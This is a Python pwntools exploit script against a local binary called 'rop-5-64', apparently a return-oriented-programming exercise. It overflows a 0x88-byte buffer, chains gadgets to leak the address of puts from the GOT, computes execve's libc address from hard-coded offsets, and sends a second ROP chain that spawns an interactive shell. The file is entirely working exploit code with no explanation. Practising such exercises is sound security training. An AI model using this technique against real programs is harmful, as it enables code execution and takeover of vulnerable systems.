#!/usr/bin/env python

from pwn import *

p = process('./rop-5-64')

puts_got = p.elf.got['puts']
puts_plt = p.elf.plt['puts']
input_func = p.elf.symbols['input_func']

print("puts_got: %s" % hex(puts_got))
print("puts_plt: %s" % hex(puts_plt))

buf = "A" * 0x88

"""
0x0000000000400763 : pop rdi ; ret
0x0000000000400688 : pop rdx ; nop ; pop rbp ; ret
0x0000000000400761 : pop rsi ; pop r15 ; ret
"""

pop_rdi = p64(0x0000000000400763)
pop_rsi_r15 = p64(0x0000000000400761)
pop_rdx_rbp = p64(0x0000000000400688)

buf += pop_rdi
buf += p64(puts_got)
buf += p64(puts_plt)
buf += p64(input_func)

p.recv()

with open("buf.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)

data = p.recv()
print(repr(data))
raw_data = data[147:]
print(repr(raw_data))
raw_data = raw_data[:6] + "\x00\x00"
print(repr(raw_data))
puts_libc = u64(raw_data)
print("Addr of printf %s" % hex(puts_libc))

"""
$1 = {<text variable, no debug info>} 0x7fc820721770 <execve>
$2 = {<text variable, no debug info>} 0x7fc8206c4690
"""

"""
0x7f2c91f46770 <execve>
$2 = {<text variable, no debug info>} 0x7f2c91ee9690 <_IO_puts>
"""
offset = 0x7f2c91f46770 - 0x7f2c91ee9690
#offset = 0x7fc820721770 - 0x7fc8206c4690

print(hex(offset))

execve = puts_libc + offset

buf = "A" * 0x88
buf += pop_rdi
buf += p64(0x400036) # '8'
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(0)
buf += p64(0)
buf += p64(execve)

p.sendline(buf)
p.interactive()
